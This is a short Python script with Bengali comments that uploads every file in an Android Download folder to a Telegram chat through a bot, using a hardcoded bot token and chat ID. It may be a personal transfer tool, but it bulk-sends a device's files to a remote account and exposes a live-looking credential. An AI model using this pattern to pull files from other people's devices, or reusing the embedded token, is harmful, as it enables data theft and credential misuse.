import os
import requests

# তোমার টেলিগ্রাম বটের টোকেন  
BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"

# তোমার টেলিগ্রাম আইডি (যেখানে ফাইল পাঠাবে)
CHAT_ID = "7348506103"

# যে ফোল্ডারের ফাইল পাঠাবে (যেমন: /sdcard/Download)
FOLDER_PATH = "/sdcard/Download"

# ফাইল আপলোড ফাংশন
def send_file(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as file:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})

# ফোল্ডারের সব ফাইল পাঠানো
for file_name in os.listdir(FOLDER_PATH):
    file_path = os.path.join(FOLDER_PATH, file_name)
    if os.path.isfile(file_path):
        send_file(file_path)
        print(f"📤 পাঠানো হয়েছে: {file_name}")

print("✅ সব ফাইল পাঠানো শেষ!")
